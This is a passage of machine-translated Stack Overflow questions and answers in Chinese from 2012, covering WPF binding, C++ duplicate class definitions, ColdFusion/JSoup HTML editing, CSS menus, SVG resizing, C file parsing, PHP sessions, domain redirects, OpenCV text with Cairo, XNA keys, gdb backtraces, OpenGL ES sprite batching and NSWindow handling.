                <SolidColorBrush Color="{Binding BindsDirectlyToSource=True, Converter={StaticResource BGColor}}"/>                                
            </Setter.Value>
        </Setter>
    </Style>
</DataGrid.RowStyle> 
```

我在输出窗格中没有得到任何关于绑定正确或错误的信息。我无法弄清楚我做错了什么。

只是为了增加乐趣，我在另一页上有相同的连接，它完全破坏了绑定。行甚至不显示。

我的问题是：

1.  我究竟做错了什么？
2.  如果做不到这一点，我该如何调试数据绑定？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T20:19:30.947

如果可能是导致您的问题的这条线：

```
_memberList = new ObservableCollection<Member>(_backingMemberList); 
```

从外观上看，您正在覆盖可能由您的属性 MemberList 使用的字段 (_memberList) ......使用不同的对象实例......但 Binding 可能指的是最初创建的......（你的代码前半部分的 _memberList 是一个实例....然后在代码的末尾设置一个新实例）...是的，您正在创建 _backingMemberList 的浅表副本...但是您已经更改了 _memberList ...并且需要告诉 Binding 使用集合的新实例。

你需要做一个`OnPropertyChanged("MemberList")`告诉它你改变了属性......或者只是不做“新”......因为你已经通过做`Clear()`和`Add()`在你的foreach中将项目添加到集合中。

* * *

还要回到你对你为什么要做你正在做的事情的解释......你可能会考虑用不同的方式来过滤你的收藏。

当您绑定到集合时，您可以使用`CollectionViewSource`WPF 生成的过滤器，而不是制作副本。`ItemsSource`它位于您的`ObservableCollection`和`DataGrid`.

*   [WPF 数据网格过滤器](https://stackoverflow.com/questions/4166403/wpf-datagrid-filter)

*   [我应该绑定到 ICollectionView 还是 ObservableCollection](https://stackoverflow.com/questions/6317860/should-i-bind-to-icollectionview-or-observablecollection)

*   [http://www.codeproject.com/Articles/47914/Working-with-ObservableCollection-T](http://www.codeproject.com/Articles/47914/Working-with-ObservableCollection-T)

*   [WPF 数据网格过滤器](https://stackoverflow.com/questions/4166403/wpf-datagrid-filter)

# c++ - 使用相同的类名

> ID：11917103
> 
> 赞同：3
> 
> 时间：2012-08-11T19:43:16.363
> 
> 标签：c++, class

我创建了两个不同的头文件，每个都包含一个具有相同名称的类，并且每个都包含在不同的 cpp 文件中，因此编译器不会抱怨重新定义它们

它们像两个不同的类一样运行，除了当它们具有相同的方法、相同的名称和相同的参数时，只调用其中一个，例如：

```
//on first cpp:
#include "same1.h"
//...
SameName obj(int_value);
obj.ok(int_value);
obj.not_ok();

//on second cpp
#include "same2.h"
//...
SameName obj(float_value);
obj.ok(float_value);
obj.not_ok(); 
```

在这两个文件上，都调用了来自 same1.h 的 not_ok，当然它还没有正确初始化

我知道问题出在哪里以及为什么会发生这种情况，我也熟悉 Name mangling 并且它们在编译时具有完全相同的名称。

我只想知道这是 C++ 的标准行为还是我的编译器是如何实现的，我的意思是，所有编译器是否应该在这种情况下做同样的事情？

我应该提到我在 Debian Linux 上使用 gcc 4.7.1。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T19:46:09.720

这违反了一个定义规则和未定义的行为。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-11T19:50:09.047

该标准规定，如果您违反此特定规则，那么您将调用未定义的行为。因此，您的案例没有标准行为。但是您可以期望它不起作用。编译器通过做某事来遵循标准，因为“某事”是“未定义行为”的一部分。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-11T19:48:09.600

通过在你的程序中包含同一个类的两个不同定义，你违反了 C++ 的规则。因此，您的程序的行为是未定义的。

# regex - ColdFusion 9 替换第 n 次出现的 HTML 标记

> ID：11917105
> 
> 赞同：2
> 
> 时间：2012-08-11T19:43:19.883
> 
> 标签：regex, coldfusion, html-parsing, coldfusion-9

我在 ColdFusion 9 的变量中存储了以下 HTML。我需要在 4th 之后插入一个新的表格行`</tr>`。即在提交按钮之前。

```
<form name="form1" id="form1" action="" method="post">
    <table>
    <tr style="visibility:hidden;display:none;"><td> <input type="hidden" id="ref1" name="ref1" value="1" > </td></tr> 
    <tr style="visibility:hidden;display:none;"><td> <input type="hidden" id="ref2" name="ref2" value="2" > </td></tr> 
    <tr>
        <th style="text-align:left;">Name&nbsp;*&nbsp;</th>
        <td><input type="text" name="foo" id="foo" size="30" maxlength="50" value=""></td>
    </tr>
    <tr>
        <th title="Please enter plain text or HTML." style="cursor:help;text-align:left;">Comment&nbsp;*&nbsp;</th>
        <td><textarea name="bar" id="bar" cols="40" rows="10" ></textarea></td>
    </tr>
    <tr>
        <th colspan="1"></th>
        <td>
            <input style="width:80px" type="submit" value="Submit">
            <input style="width:80px" type="button" value="Cancel">
        </td>
    </tr>
</table> 
```

ReReplace 似乎是要走的路，但我无法正确使用正则表达式。另一种选择是拆分字符串并在中间使用我的新 HTML 重建它。任何建议，将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-11T21:31:44.940

正则表达式是错误的工具——你需要一个 HTML 解析器。

以下是使用[JSoup](http://jsoup.org)的方法：

```
<cfsavecontent variable="InputHtml">
    [insert code from question]
</cfsavecontent>

<cfsavecontent variable="NewRow">
    <tr><th>whatever</th><td>stuff</td></tr>
</cfsavecontent>

<!--- Read "Creating Objects From Jar Files" --->
<cfset jsoup = createObject('java','org.jsoup.Jsoup') />

<cfset HtmlDom = jsoup.parse(InputHtml) />

<cfset HtmlDom.select('tr:eq(4)').after( NewRow ) />

<cfoutput>
    <pre>#XmlFormat(HtmlDom.body().html())#</pre>
</cfoutput> 
```

您可以在[JSoup Selector API中查看支持哪些选择器的详细信息](http://jsoup.org/apidocs/org/jsoup/select/Selector.html)

如果您不知道/关心表格中有多少行，您可以...

```
HtmlDom.select('table>tbody').append( NewRow ) 
```

...只需在最后添加新行。

## 从 Jar 文件创建对象

如果您复制并粘贴上面的代码很可能不会立即运行，因为您的服务器不知道 JSoup - 您需要下载 Jar 文件并将其放在合理的位置。

对于 CF9，您需要将 jsoup-1.6.3.jar 复制到您的 {coldfusion}/lib 目录中，然后重新启动服务器。

对于 CF10，您可以`this.JavaSettings`在 Application.cfc 中使用（[如此处所述](http://www.bennadel.com/blog/2358-Parsing-Traversing-And-Mutating-HTML-With-ColdFusion-And-jSoup.htm)）将其放置在不同的位置。

对于 Railo 和 OpenBD，您可以将 JAR 文件的位置指定为第三个参数，例如：

```
<cfset jsoup = createObject('java','org.jsoup.Jsoup','lib/jsoup-1.6.3.jar') /> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T06:56:05.047

我建议使用 jQuery 执行此操作：

```
​$(document).ready(function(){

   $($('form tr')[3]).after('<tr><td>row</tr></tr>');

});​ 
```

容易得多。

# css - 当鼠标悬停在子菜单上时，使用 CSS 保持顶级导航悬停效果

> ID：11917108
> 
> 赞同：0
> 
> 时间：2012-08-11T19:43:43.737
> 
> 标签：css, navigation, nav

当我悬停在子菜单项上时，我想让我的顶级导航保持悬停状态。我读到我应该将悬停效果应用于 li，但有些过渡让我感到困惑。我想不通。有人可以告诉我需要在哪里调整吗？

[我的 jsfiddle](http://jsfiddle.net/imakeitpretty/zwVwh/1/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T19:47:09.133

您将希望将`:hover`效果应用于 li 并将 CSS 应用于直接`a`子级。将悬停应用到`a`将不起作用，因为顶级链接的子菜单不在`a`元素中。

```
ul#navigation .topNav:hover > a {
    color:#acb453;
    padding-top:0;
    padding-bottom:10px;
    border-bottom: 6px solid #4dbaf2;
} 
```

[http://jsfiddle.net/zwVwh/12/](http://jsfiddle.net/zwVwh/12/)

# javascript - 根据窗口大小调整 HTML 中的 SVG 图像大小

> ID：11917113
> 
> 赞同：1
> 
> 时间：2012-08-11T19:45:28.777
> 
> 标签：javascript, jquery, html, svg

我的项目有一个徽标，希望将其放置在网页顶部。徽标为 SVG 格式，默认大小为 1280x256 像素。我希望在更改窗口大小时调整此图像的大小。我怎样才能做到这一点？我需要 jQuery 还是可以用简单的 JavaScript 来完成？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:06:51.043

实际上有很多方法可以实现这一目标。选择哪一个取决于你想要什么样的行为。一些例子（假设你`img`有 ID `image`）：

**1\. CSS 使用相对大小：**

```
#image { width: 10%; } 
```

图像始终为屏幕宽度的 10%，并且会自动调整。

**2\. CSS 使用媒体查询：**

```
#image { width: 100px; }
@media (min-width: 600px) {
    #image { width: 300px; }
} 
```

如果屏幕宽于 600px，则图像为 300px 宽，否则为 100px 宽。宽度会自动调整，但会“跳转”到它的新值。

**3\. jQuery：**

```
$(window).resize(function(){
    var w = $(window).width();
    $("#image").width(w * 0.1);
}); 
```

这等效于示例 #1。请注意，您可以根据需要在 JS 中进行自己的计算，因此此解决方案比 CSS 更灵活（但可能会使调整大小变慢）。#4 也是如此。

**4.纯JavaScript：**

```
window.onresize = function(event) {
    var w = 0;
    if (window.innerWidth != null) {
        w = window.innerWidth;
    }
    else if (document.body != null) {
        w = document.body.clientWidth;
    }
    document.getElementById("image").style.width = (w >= 600) ? 300 : 100;
}; 
```

这等效于示例 #2。

此外，jQuery**是**JavaScript，但很多人认为它是一种替代方案……jQuery 只是一种让 JavaScript 开发在许多情况下更加舒适的方式（正如您可能在上面的示例中注意到的那样）。;)

# c - 动态数组 C 不适用于所有输入

> ID：11917114
> 
> 赞同：1
> 
> 时间：2012-08-11T19:45:31.730
> 
> 标签：c, dynamic-arrays

我正在尝试进行矩阵链乘法，我需要从 C 中的文件中获取输入

它适用于一个测试用例，而其他运行失败

测试用例#1（这工作正常）

```
3 5
5 7
7 9
9 6
6 7
7 9 
```

测试用例 #2（这使 matrix.exe 停止工作）

```
30 35
35 15
15 5
5 10
10 20
20 25 
```

注意：在测试用例中，连续数字是矩阵的行和列

这是我正在使用的代码

```
int *p,i=0;
char str[3],*extra;
FILE * file;
file = fopen("D:/Dump/testcases/matrix.txt", "r");
if (file) {
    while (fscanf(file, "%s", str)!=EOF){
        switch(i){
            case 0:     p=(int *)malloc(sizeof(int));
                        *(p)=atoi(str);
                        break;
            default:    *(p+i)=(int)malloc(sizeof(int));
                        *(p+i)=atoi(str);
                        break;
        }
        i++;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:10:35.230

这么多的问题和误解；很难提供有用的建议。

据我了解，您的意思是读取一系列矩阵的维度，每行输入有两个数字，第 N 行中的第二个数字应该与第 N+1 行中的第一个数字相同。在到达 EOF 之前，您不知道会有多少行输入。一般来说，数字应该都是一位或两位数（不能更长）。数组的实际数据存储在其他地方，或生成——它不在此代码中处理。

你的代码是：

```
int *p,i=0;
char str[3],*extra;
FILE * file;
file = fopen("D:/Dump/testcases/matrix.txt", "r");
if (file) {
    while (fscanf(file, "%s", str)!=EOF){
        switch(i){
            case 0:     p=(int *)malloc(sizeof(int));
                        *(p)=atoi(str);
                        break;
            default:    *(p+i)=(int)malloc(sizeof(int));
                        *(p+i)=atoi(str);
                        break;
        }
        i++;
    }
} 
```

*   文件打开正常；你没有显示关闭，但这是一个小问题。
*   您不限制读取的字符串的大小；您可以使用它`%2s`来确保不会溢出您使用的（相当短的）字符串。
*   您没有检查`fscanf()`实际阅读了 1 个项目。有了字符串就可以了。如果您直接读取整数，那就不行了。您可以转换 0 个整数，这既不是 EOF 也不是 1。您应该使用`while (fscanf(file, "%2s", str) == 1)`.
*   没有非常明显的理由不`fscanf()`为您进行转换。
*   OTOH，您也不能`fscanf()`在一行中强制要求（仅）两个数字；它会很高兴将所有数字放在一行上，或者每个数字单独放在一行上，每行之间有 2 个空白行包含数字。
*   这`switch`有点奇怪。该`default`子句可能应该使用`realloc()`而不是`malloc()`，并且在中的转换`default`存在严重问题。内存分配方案作为一个整体是有很大缺陷的，这是你知道的，因为你问了这个问题。你可以通过写来拯救它：

    ```
    default:
        p = (int *)realloc(p, (i+1) * sizeof(int));
        p[i] = atoi(str);  /* Or *(p+i) if you prefer */
        break; 
    ```

总的来说，我认为您需要考虑一次读取一行 ( `fgets()`)，然后使用`sscanf()`. 您可能应该考虑一次为数组分配两个整数。

```
int  *p = 0;
int   i = 0;
FILE *file = fopen("D:/Dump/testcases/matrix.txt", "r");

if (file != 0)
{
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), file) != 0)
    {
        int d1, d2;
        char c;
        if (sscanf(buffer, "%d%d%c", &d1, &d2, &c) != 3 || c != '\n')
        {
            fprintf(stderr, "Badly formatted line: %s", buffer);
            break;
        }
        void *space;
        if (i == 0)
            space = malloc(2 * (i + 1) * sizeof(int));
        else
            space = realloc(p, 2 * (i + 1) * sizeof(int));
        if (space == 0)
        {
            fprintf(stderr, "Memory allocation failed (%d bytes)\n", 2 * (i + 1) * sizeof(int));
            break;
        }
        p = (int *)space;
        p[2*i + 0] = d1;
        p[2*i + 1] = d2;
        i++;
    }
    fclose(file);
}

/* i is the number of lines read (sets of matrix dimensions) */
/* p is the pointer to 2*i array dimensions */
/* ...Use i and p... */
free(p); 
```

代码不会检查一行上的第二个维度是否与下一行上的第一个维度相同。它不检查 1 位或 2 位的正整数（基本上是 1..99）；它允许更大的值、零和负值。（测试`c == '\n'`确保第二个数字后有换行符；不允许出现尾随空格等。）

鉴于`p`（现在）已初始化为 0（空指针），您可以不使用 the`malloc()`并简单地`realloc()`无条件使用。大多数人不喜欢这样做，但它避免了重复。

# php - 如何跨页面获取数组？

> ID：11917120
> 
> 赞同：0
> 
> 时间：2012-08-11T19:46:31.670
> 
> 标签：php, arrays, session

我正在尝试在页面
page1 中获取一个数组：

```
session_start();
$input01 = array("img01.png", "img02.png", "img03.png);
$_SESSION['input01']=$input01; 
```

第2页：

```
session_start();
shuffle($input01); 
```

结果：*警告：shuffle() 期望参数 1 是数组，在....中给出 null*
似乎 input01 不可用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T19:47:52.403

在 page2 上，您必须从`$_SESSION`数组中提取值。

```
session_start();
$input01 = isset($_SESSION['input01']) ? $_SESSION['input01'] : array();
shuffle($input01); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T19:47:42.277

```
shuffle( $_SESSION['input01'] ); 
```

你最好不要注册全局变量！

# dns - 同一网站的多个域

> ID：11917123
> 
> 赞同：0
> 
> 时间：2012-08-11T19:46:55.343
> 
> 标签：dns, uri, tld

简短的问题：为同一网站路由多个域的最佳方法是什么？具体来说，如何使用国际 tld（.рф 或 .срб）和 ascii tld（分别为 .ru 或 .rs）路由 uri？

长问题：我有同一个网站的两个域名，一个 ascii 和一个国际（西里尔字母），[http](http://domain.rs) ://domain.rs 和 http://домен.срб 指向同一个网站。一方面，我知道许多网站同时使用这两个域（例如[http://rts.rs](http://rts.rs)和 http://ртс.срб），但另一方面，我被告知这是从 SEO 的角度来看，这是一种不好的做法，相反，我应该将一个域重定向到另一个域。А 是否有任何建议或资源可以让我了解如何处理国际域名和 ascii 域名？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T14:38:28.437

使用“并行”域，而没有就地某种规范化，将导致重复的内容问题。所以，我根本不建议这样做。

（可以说，有一个“漏洞”，它允许不同的 TLD 为不同的本地人独立出现，但实际上这对你没有任何好处，只是消除了一些 DC 问题......）

如果我理解正确，那么正确的做法是坚持一个主域并为所有其他域使用 301 重定向（最好是逐页）。Ascii 与否，无关紧要。对于主域，选择您“最旧”的一个或/和具有最多入站链接的一个。

从长远来看，这也是最实用的解决方案，因为它可以让您集中精力建立链接，将所有入站链接集中在一个获胜者身上，而不是仅仅将它们分散在几个平庸者之间。

# image - OpenCV：如何在 cvPutText 中使用 HERSHEY 以外的其他字体（如 Arial）

> ID：11917124
> 
> 赞同：14
> 
> 时间：2012-08-11T19:47:02.657
> 
> 标签：image, opencv, truetype

我想向图像写入格式化文本。OpenCV 仅提供一组有限的默认字体。可以用别人吗？例如从 *.ttf 文件中读取它们（在 Ubuntu 中）？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2014-10-10T20:54:07.970

如果您不能或不想使用 Qt 绑定，这里有一种使用 CAIRO 的方法：

```
#include <opencv2/opencv.hpp>
#include <cairo/cairo.h>
#include <string>

void putTextCairo(
        cv::Mat &targetImage,
        std::string const& text,
        cv::Point2d centerPoint,
        std::string const& fontFace,
        double fontSize,
        cv::Scalar textColor,
        bool fontItalic,
        bool fontBold)
{
    // Create Cairo
    cairo_surface_t* surface =
            cairo_image_surface_create(
                CAIRO_FORMAT_ARGB32,
                targetImage.cols,
                targetImage.rows);

    cairo_t* cairo = cairo_create(surface);

    // Wrap Cairo with a Mat
    cv::Mat cairoTarget(
                cairo_image_surface_get_height(surface),
                cairo_image_surface_get_width(surface),
                CV_8UC4,
                cairo_image_surface_get_data(surface),
                cairo_image_surface_get_stride(surface));

    // Put image onto Cairo
    cv::cvtColor(targetImage, cairoTarget, cv::COLOR_BGR2BGRA);

    // Set font and write text
    cairo_select_font_face(
                cairo,
                fontFace.c_str(),
                fontItalic ? CAIRO_FONT_SLANT_ITALIC : CAIRO_FONT_SLANT_NORMAL,
                fontBold ? CAIRO_FONT_WEIGHT_BOLD : CAIRO_FONT_WEIGHT_NORMAL);

    cairo_set_font_size(cairo, fontSize);
    cairo_set_source_rgb(cairo, textColor[2], textColor[1], textColor[0]);

    cairo_text_extents_t extents;
    cairo_text_extents(cairo, text.c_str(), &extents);

    cairo_move_to(
                cairo,
                centerPoint.x - extents.width/2 - extents.x_bearing,
                centerPoint.y - extents.height/2- extents.y_bearing);
    cairo_show_text(cairo, text.c_str());

    // Copy the data to the output image
    cv::cvtColor(cairoTarget, targetImage, cv::COLOR_BGRA2BGR);

    cairo_destroy(cairo);
    cairo_surface_destroy(surface);
} 
```

示例调用：

```
putTextCairo(mat, "Hello World", cv::Point2d(50,50), "arial", 15, cv::Scalar(0,0,255), false, false); 
```

它假设目标图像是 BGR。

它将文本的中心置于给定点。如果你想要一些不同的定位，你必须修改`cairo_move_to`调用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-16T15:54:06.830

可以使用其他字体，但您需要将 Qt 库链接到 OpenCV 并将 cvAddText 函数与 cvFontQt 一起使用

[http://docs.opencv.org/modules/highgui/doc/qt_new_functions.html#addtext](http://docs.opencv.org/modules/highgui/doc/qt_new_functions.html#addtext)

[http://docs.opencv.org/modules/highgui/doc/qt_new_functions.html#fontqt](http://docs.opencv.org/modules/highgui/doc/qt_new_functions.html#fontqt)

您可以尝试其他解决方案，它们的性能或多或少与 OpenCV 相同。例如，您可以使用 CAIRO 将字体写入图像。

# xna - XNA 键数 1

> ID：11917126
> 
> 赞同：5
> 
> 时间：2012-08-11T19:47:09.320
> 
> 标签：xna, key

我需要询问何时按下数字 1 键，而不是在 Numpad 上，而是 Q 上方的数字 1（尽量使这一点尽可能清晰）。

我已经浏览了 Keys 数组上的所有可用键，但没有一个与我正在寻找的匹配。

有没有办法做到这一点，我错过了？

我的代码：

```
If (currentKeyboardState.IsKeyDown(Keys.1)) 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-11T19:54:06.860

应该是 Keys.D1 键。数字键是 D0-D9。文档在[这里](http://msdn.microsoft.com/en-us/library/microsoft.xna.framework.input.keys.aspx)。

文档说：用于杂项字符；它可能因键盘而异。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-28T00:21:52.153

澄清一下：Keys.D1 有效（例如 Keys.D[在此处插入编号]）。

```
if (keyState.IsKeyDown(Keys.D4))
{
Console.WriteLine("You pressed the 4 key above E and R!");
} 
```

# debugging - gdb 回溯输出和 otx (otool) 输出？

> ID：11917128
> 
> 赞同：0
> 
> 时间：2012-08-11T19:47:17.743
> 
> 标签：debugging, assembly, gdb, otool

为什么该程序的 otx (otool) 汇编输出中没有 gdb 回溯输出中的地址？我的印象是它们对应于我的 otool asm 输出中的偏移量......如果这是一个愚蠢的问题，我深表歉意。

 ````
(gdb) bt
#0  0x9a4e1aa2 in __semwait_signal ()
#1  0x9a4e175e in _pthread_cond_wait ()
#2  0x9a4e12b1 in pthread_cond_timedwait$UNIX2003 ()
#3  0x0d8f3f87 in unregister_ShockwaveFlash ()
#4  0x0d45cf19 in dyld_stub_write$UNIX2003 ()
#5  0x0d6f9d7e in dyld_stub_write$UNIX2003 ()
#6  0x0d72db5a in dyld_stub_write$UNIX2003 ()
#7  0x0d72e24c in dyld_stub_write$UNIX2003 ()
#8  0x0d8eb5a2 in unregister_ShockwaveFlash ()
#9  0x0d95b9c9 in unregister_ShockwaveFlash ()
#10 0x9277df60 in CAOpenGLLayerDraw ()
#11 0x9277e897 in -[CAOpenGLLayer _display] ()
#12 0x92503ef1 in CALayerDisplayIfNeeded ()
#13 0x925032bc in CA::Context::commit_transaction ()
#14 0x92502f04 in CA::Transaction::commit ()
#15 0x958a1dd2 in __CFRunLoopDoObservers ()
#16 0x9585d3ea in CFRunLoopRunSpecific ()
#17 0x9585d1f1 in CFRunLoopRunInMode ()
#18 0x95530e04 in RunCurrentEventLoopInMode ()
#19 0x95530bb9 in ReceiveNextEventCommon ()
#20 0x956b9084 in _AcquireNextEvent ()
#21 0x956aed40 in RunApplicationEventLoop ()
#22 0x100083e2 in fkDecode ()
#23 0x10026167 in fkCall ()
#24 0x100081f6 in fkDecode ()
#25 0x10026167 in fkCall ()
#26 0x100081f6 in fkDecode ()
#27 0x10003be5 in fkRunMain ()
#28 0x00001e84 in main ()</code> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T04:31:08.980

以下内容可能对您有所帮助：

*   由于地址空间布局随机化 (ASLR)，在全局和局部范围中定义的变量可能具有不同的地址
*   如果您的程序是多线程的，堆分配的变量可能由于 ASLR 而具有不同的地址

在 Linux GDB 上默认禁用 ASLR。在 Mac 上尝试禁用 ASLR。`

# ios - 从单个 OpenGL ES 纹理渲染多个精灵

> ID：11917141
> 
> 赞同：1
> 
> 时间：2012-08-11T19:49:04.447
> 
> 标签：ios, opengl-es

我是 OpenGL ES 1.1 的新手，我正在尝试通过创建一组函数来慢慢开始，这些函数将从我的 iPhone 上的单个纹理渲染多个精灵。我的工作正如我所期望的那样（但如果我犯了任何明显的错误，请告诉我），但现在我正在寻找优化我的代码。因此，我有两个问题：

1）我怎样才能加快下面的代码？据我了解，我应该能够从同一个 OpenGL 纹理批量调用多个绘制调用以加快渲染速度。我该怎么做呢，有没有我应该注意的好的代码示例？

2) 使用 glOrthof 我将坐标系更改为从 0、0 运行到我的设备宽度和高度。在传递 glTexCoordPointer 纹理坐标时，是否有类似的处理方式允许我传递像素值？

作为参考，这是我的代码：

```
- (void)drawGLView
{
    [EAGLContext setCurrentContext:context];

    glBindFramebufferOES(GL_FRAMEBUFFER_OES, viewFramebuffer);

    glClearColor( 0, 0, 0, 0.0);
    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

    glBindTexture(GL_TEXTURE_2D, spriteTexture);
    glEnableClientState(GL_VERTEX_ARRAY);
    glEnableClientState(GL_TEXTURE_COORD_ARRAY);

    for(Sprite *sprite in self.sprites)
    {
        [self drawAtPoint:sprite.location];
    }
    glDisableClientState(GL_VERTEX_ARRAY);
    glDisableClientState(GL_TEXTURE_COORD_ARRAY);

    glBindRenderbufferOES(GL_RENDERBUFFER_OES, viewRenderbuffer);
    [context presentRenderbuffer:GL_RENDERBUFFER_OES];
}

- (void)drawAtPoint:(CGPoint)point
{
    GLfloat x = point.x, y = point.y;
    GLfloat w = self.spritesheet.size.width;
    GLfloat h = self.spritesheet.size.height;
    GLfloat box[] = {
        x, y + h, 0,
        x, y, 0,
        x + w, y + h, 0,
        x + w, y , 0
    };
    GLfloat tex[] = {
        0, 1,
        0, 0,
        1, 1,
        1, 0
    };

    glVertexPointer(3, GL_FLOAT, 0, box);
    glTexCoordPointer(2, GL_FLOAT, 0, tex);

    glDrawArrays(GL_TRIANGLE_STRIP, 0, 4);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T17:29:48.453

1）这是我用于我的粒子系统的东西（它在 c++ 中，但你会明白这一点）。你可以把你的纹理排成一行（水平的，并且都具有相同的大小），并用正确的方式绘制它id, 0-first tex , 1-second 等等；

```
class gltAtlasRenderer
{
public:
    float* partVdata;
    float* partCdata;
    float* partTdata;

    int counter1,counter2,counter3;
    int count;
    bool isz;
    int tilesize;
    float tilesx;
    gltAtlasRenderer(int maxTextures,bool iszi,int numberoftiles)
    {
        isz=iszi;
        if(isz)partVdata=(float*)malloc(maxTextures*18*4);
        else partVdata=(float*)malloc(maxTextures*12*4);

        partCdata=(float*)malloc(maxTextures*24*4);
        partTdata=(float*)malloc(maxTextures*12*4);
        tilesize=numberoftiles;
        tilesx=(float)(1.0f/numberoftiles);
    }
    void Draw(int id,float x,float y,float z,float scalex,float scaley,float angle,float r,float g,float b,float a)
    {
        angle*=0.017453f;
        for(int c2=0;c2<12;c2+=2)
        {
                float x=squarevData[c2]*scalex;
                float y=squarevData[c2+1]*scaley;
                float cos1=cos(angle);
                float sin1=sin(angle);
                squarevData2[c2] = (cos1*x) - ( sin1*y);
                squarevData2[c2+1] = (sin1*x) + ( cos1*y);
        }

        //up left
        partVdata[counter1++]=x+squarevData2[0];
        partVdata[counter1++]=y+squarevData2[1];
        if(isz)partVdata[counter1++]=z;
        partCdata[counter2++]=r;
        partCdata[counter2++]=g;
        partCdata[counter2++]=b;
        partCdata[counter2++]=a;
        partTdata[counter3++]=tilesx*id;
        partTdata[counter3++]=1;

        //up right
        partVdata[counter1++]=x+squarevData2[2];
        partVdata[counter1++]=y+squarevData2[3];
        if(isz)partVdata[counter1++]=z;
        partCdata[counter2++]=r;
        partCdata[counter2++]=g;
        partCdata[counter2++]=b;
        partCdata[counter2++]=a;
        partTdata[counter3++]=tilesx*id+tilesx;
        partTdata[counter3++]=1;

        //down left
        partVdata[counter1++]=x+squarevData2[4];
        partVdata[counter1++]=y+squarevData2[5];
        if(isz)partVdata[counter1++]=z;
        partCdata[counter2++]=r;
        partCdata[counter2++]=g;
        partCdata[counter2++]=b;
        partCdata[counter2++]=a;
        partTdata[counter3++]=tilesx*id;
        partTdata[counter3++]=0;

        //up right
        partVdata[counter1++]=x+squarevData2[6];
        partVdata[counter1++]=y+squarevData2[7];
        if(isz)partVdata[counter1++]=z;
        partCdata[counter2++]=r;
        partCdata[counter2++]=g;
        partCdata[counter2++]=b;
        partCdata[counter2++]=a;
        partTdata[counter3++]=tilesx*id+tilesx;
        partTdata[counter3++]=1;

        //down right
        partVdata[counter1++]=x+squarevData2[8];
        partVdata[counter1++]=y+squarevData2[9];
        if(isz)partVdata[counter1++]=z;
        partCdata[counter2++]=r;
        partCdata[counter2++]=g;
        partCdata[counter2++]=b;
        partCdata[counter2++]=a;
        partTdata[counter3++]=tilesx*id+tilesx;
        partTdata[counter3++]=0;

        //down left
        partVdata[counter1++]=x+squarevData2[10];
        partVdata[counter1++]=y+squarevData2[11];
        if(isz)partVdata[counter1++]=z;
        partCdata[counter2++]=r;
        partCdata[counter2++]=g;
        partCdata[counter2++]=b;
        partCdata[counter2++]=a;
        partTdata[counter3++]=tilesx*id;
        partTdata[counter3++]=0;

        count++;

    }
    void RenderStart()
    {
        counter1=counter2=count=counter3=0;

    }
    void RenderStop(int textureid)
    {
        glEnable(GL_TEXTURE_2D);
        glTexEnvf(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE,GL_MODULATE);
        glEnableClientState(GL_COLOR_ARRAY);
        glEnableClientState(GL_TEXTURE_COORD_ARRAY);
        glEnableClientState(GL_VERTEX_ARRAY);
        glBindTexture(GL_TEXTURE_2D, textureid);
        glTexCoordPointer(2, GL_FLOAT, 0, partTdata);
        glColorPointer(4, GL_FLOAT, 0,partCdata );
        if(isz)glVertexPointer(3, GL_FLOAT, 0, partVdata);
        else glVertexPointer(2, GL_FLOAT, 0, partVdata);
        glDrawArrays(GL_TRIANGLES, 0, count*6);
        glDisableClientState(GL_COLOR_ARRAY);
        glDisableClientState(GL_TEXTURE_COORD_ARRAY);
        glDisableClientState(GL_VERTEX_ARRAY);

    }
};

gltAtlasRenderer ar=new gltAtlasRenderer(100,false,5);//max textures, is there z,max textures in texture
ar.RenderStart();
void Render()
{
     for(int c=0;c<100;c++)ar.Draw(0,x,y,z,scalex,scaley,rotation,r,g,b,a);
}
ar.RenderStop(textureid); 
```

2）如果我理解正确，您想使用纹理大小的纹理坐标（而不是 0 到 1 的比例）

例如，在纹理 512x512 中，纹理坐标将为

```
float cv(float maxsize,float num)
{
     return (num/maxsize);
}

cv(0),cv(0)//bot,left
cv(512),cv(0)//bot,right
cv(512),cv(512)//top,right
cv(0),cv(512)//bot,left 
```

# objective-c - 以编程方式关闭 NSWindow

> ID：11917143
> 
> 赞同：2
> 
> 时间：2012-08-11T19:49:20.640
> 
> 标签：objective-c, macos, cocoa, nswindow

我正在尝试以编程方式打开和关闭一个窗口。这是我的尝试，我打开但没有关闭它。我已经尝试了很多方法，但我认为我必须对它做一些事情`NSWindow`才能让它在其他部分工作。

**AppDelegate.h**

```
#import <Cocoa/Cocoa.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>

@class AVPlayer;
@interface AppDelegate : NSObject <NSApplicationDelegate> {
    IBOutlet WebView *news;
    IBOutlet NSButton *play;
    IBOutlet NSButton *options;
    IBOutlet NSButton *realmlist;
    IBOutlet NSTextField *version;
    AVPlayer *audioPlayer;
}

@property (assign) IBOutlet NSWindow *window;

@property (nonatomic, retain) IBOutlet WebView *news;
@property (nonatomic, retain) IBOutlet NSTextField *version;
@property (nonatomic, retain) AVPlayer *audioPlayer;

-(IBAction)play:(id)sender;
-(IBAction)changeRealmlist:(id)sender;
-(IBAction)close:(id)sender;
-(IBAction)removeCache:(id)sender;
-(IBAction)sOptions:(id)sender;
@end 
```

**AppDelegate.m**

```
-(IBAction)sOptions:(id)sender{
